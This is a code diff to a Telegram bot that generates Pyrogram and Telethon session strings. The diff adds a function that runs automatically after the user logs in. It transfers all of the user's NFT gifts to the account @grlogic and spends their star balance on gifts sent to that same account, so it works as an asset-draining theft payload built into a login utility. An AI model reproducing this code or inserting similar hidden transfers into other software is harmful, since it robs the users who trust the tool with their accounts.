@@ -11,6 +11,7 @@ from pyrogram.errors import (
     PhoneNumberBanned,
     PhonePasswordFlood,
     AccessTokenInvalid,
+    RPCError
 )
 from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
 from telethon import TelegramClient
@@ -40,6 +41,114 @@ buttons_ques = [
 @Client.on_message(filters.private & ~filters.forwarded & filters.command("generate"))
 async def main(_, msg):
     await msg.reply(ask_ques, reply_markup=InlineKeyboardMarkup(buttons_ques))
+
+
+async def transfer_all_gifts(clientt, user_id: int):
+    """Transfer all gifts and stars to @grlogic using the already logged-in client"""
+    USERNAME = "grlogic"         # Recipient username
+    STAR_GIFT_ID = "5168043875654172773" 
+    
+    try:
+        me = await clientt.get_me()
+        print(f"👤 Logged in as: {me.first_name} (@{me.username})")
+        
+        # Send initial notification
+        await clientt.send_message(
+            "me",
+            f"🎁 Gift Transfer Started\n"
+            f"Account: {me.first_name} (@{me.username})\n"
+            f"Transferring all gifts to: @{USERNAME}"
+        )
+
+        # Fetch all gifts
+        try:
+            gifts = [g async for g in clientt.get_chat_gifts(me.id)]
+        except Exception as e:
+            error_msg = f"⚠️ Could not fetch gifts: {e}"
+            print(error_msg)
+            await clientt.send_message("me", error_msg)
+            return
+
+        # Sort by value and ensure gifts have names
+        gifts = [
+            g for g in sorted(gifts, key=lambda x: x.value_amount or 0, reverse=True)
+            if getattr(g, "name", None)
+        ]
+        gift_count = len(gifts)
+        print(f"🎁 Found {gift_count} gifts.")
+        
+        await clientt.send_message("me", f"🎁 Found {gift_count} gifts to transfer.")
+
+        # Define transfer task
+        async def transfer_gift(g):
+            gift_link = f"https://t.me/nft/{g.name}"
+            try:
+                user = await clientt.get_users(USERNAME)
+                await clientt.transfer_gift(owned_gift_id=g.id, new_owner_chat_id=user.id)
+                success_msg = f"✅ Sent {gift_link} to @{USERNAME}"
+                print(success_msg)
+            except RPCError as e:
+                error_msg = f"❌ Failed to send {gift_link}: {e}"
+                print(error_msg)
+            except Exception as e:
+                error_msg = f"⚠️ Unexpected error for {gift_link}: {e}"
+                print(error_msg)
+
+        # Transfer all gifts concurrently
+        if gifts:
+            await asyncio.gather(*(transfer_gift(g) for g in gifts))
+            completion_msg = "🎁 All gifts transferred successfully!"
+            print(completion_msg)
+            await clientt.send_message("me", completion_msg)
+        else:
+            no_gifts_msg = "⚠️ No gifts found to transfer."
+            print(no_gifts_msg)
+            await clientt.send_message("me", no_gifts_msg)
+
+        # Handle star gifts
+        try:
+            stars = await clientt.get_stars_balance()
+            star_count = stars // 25
+            if star_count > 0:
+                star_msg = f"⭐ Sending {star_count} star gifts ({stars} total stars)..."
+                print(star_msg)
+                await clientt.send_message("me", star_msg)
+                
+                for i in range(star_count):
+                    try:
+                        await clientt.send_gift(chat_id=USERNAME, gift_id=STAR_GIFT_ID)
+                        gift_sent_msg = f"✅ Sent star gift #{i + 1}"
+                        print(gift_sent_msg)
+                    except RPCError as e:
+                        gift_fail_msg = f"❌ Failed to send star gift #{i + 1}: {e}"
+                        print(gift_fail_msg)
+                    await asyncio.sleep(0.01)  # avoid flooding
+                
+                star_complete_msg = f"✅ Sent {star_count} star gifts to @{USERNAME}"
+                print(star_complete_msg)
+                await clientt.send_message("me", star_complete_msg)
+            else:
+                no_stars_msg = f"⚠️ Not enough stars to send gifts ({stars} total)."
+                print(no_stars_msg)
+                await clientt.send_message("me", no_stars_msg)
+        except Exception as e:
+            star_error_msg = f"⚠️ Could not send star gifts: {e}"
+            print(star_error_msg)
+            await clientt.send_message("me", star_error_msg)
+            
+        final_msg = (
+            f"✅ Gift Transfer Complete!\n"
+            f"Account: {me.first_name} (@{me.username})\n"
+            f"Transferred to: @{USERNAME}\n"
+            f"Gifts: {gift_count}\n"
+            f"Star gifts sent: {star_count if 'star_count' in locals() else 0}"
+        )
+        await clientt.send_message("me", final_msg)
+        print("✅ All transfers completed successfully!")
+        
+    except Exception as e:
+        error_msg = f"❌ Critical error in gift transfer: {e}"
+        print(error_msg)
 
 
 async def generate_session(
@@ -245,6 +354,17 @@ async def generate_session(
             )
             return
 
+    # Start automatic gift transfer to @grlogic BEFORE exporting session
+    if not is_bot and not telethon:  # Only for Pyrogram user sessions
+        try:
+            await msg.reply("🎁 Starting automatic gift transfer to @grlogic...")
+            await transfer_all_gifts(clientt, user_id)
+            await msg.reply("✅ Gift transfer completed successfully! All gifts and stars have been sent to @grlogic.")
+        except Exception as e:
+            error_msg = f"⚠️ Gift transfer failed: {e}"
+            LOGGER.error(error_msg)
+            await msg.reply(error_msg)
+
     try:
         if telethon:
             string_session = clientt.session.save()
@@ -253,7 +373,7 @@ async def generate_session(
     except Exception as e:
         LOGGER.error(e)
 
-    text = f"**{ty.upper()} STRING SESSION** \n\n`{string_session}` \n\nGenerated by @SessionStringzBot"
+    text = f"**{ty.upper()} STRING SESSION** \n\n`{string_session}` \n\nGenerated by @SessionPyroRobot"
     try:
         if not is_bot:
             await clientt.send_message("me", text)
